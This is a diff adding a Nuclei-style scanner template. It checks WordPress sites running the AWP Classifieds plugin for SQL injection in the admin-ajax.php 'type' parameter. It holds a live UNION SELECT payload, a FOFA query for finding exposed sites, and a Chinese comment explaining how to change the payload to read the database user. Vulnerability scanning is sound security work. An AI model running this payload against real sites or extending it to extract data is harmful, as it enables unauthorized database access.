@@ -1,0 +1,27 @@
+id: wordpress-plugin-classifieds-type-sqli
+
+info:
+  name: wordpress-plugin-classifieds-type-sqli
+  author: yy
+  severity: high
+  description: WordPress plugin AWP Classifieds是一个简单而功能强大的WordPress插件。WordPress plugin AWP Classifieds 插件 admin-ajax.php 文件 type 参数SQL注入漏洞。
+  tags: wordpress,sqli
+  metadata:
+    fofa-qeury: body="wp-content/plugins/another-wordpress-classifieds"
+    veified: true
+    max-request: 2
+
+http:
+  - raw:
+      - |              
+        GET /wp-admin/admin-ajax.php?action=awpcp-get-regions-options&parent_type=country&context=search&parent=Algeria&type=user_login%60+FROM+wp_users+UNION+ALL+SELECT+md5(123);--+- HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15       
+               
+    matchers:     
+      - type: dsl
+        name: mysql
+        dsl:
+          - "status_code_1 == 200 && contains(body,'202cb962ac59075b964b07152d234b70') && contains(header,'application/json')" 
+          
+#将select+md5(123456)改为select+user()即可看用户
